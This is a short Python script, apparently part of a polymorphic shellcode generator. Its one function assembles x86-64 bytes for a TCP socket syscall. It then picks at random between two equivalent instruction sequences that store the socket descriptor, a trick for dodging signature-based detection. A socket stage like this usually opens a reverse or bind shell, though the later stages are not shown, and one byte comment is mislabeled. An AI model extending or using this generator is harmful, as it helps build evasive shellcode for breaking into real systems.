#!/usr/bin/env python3
import random
from func_instru import *

def partie1():

    # PARTIE : SOCKET
    
    moval = movx("al",41) # mov al, 41
    movdil = movx("dil",2) # mov dil, 2
    movsil = movx("sil",1) # mov sil, 1
    movdl = movx("dl",6) # mov dl, 6
    syscall = '\\x0f\\x05' # syscalls


    part1 = [
        '\\x50\\x41\\x58', # push rax, pop r8
        '\\x49\\x89\\xc0' # push r8, rax
    ]

    x = random.randint(0, 1)

    if x == 0 :
        choix = part1[0]
    elif x == 1 :
        choix = part1[1]

    resultat_concat = moval + movdil + movsil + movdl + syscall + choix

    return resultat_concat    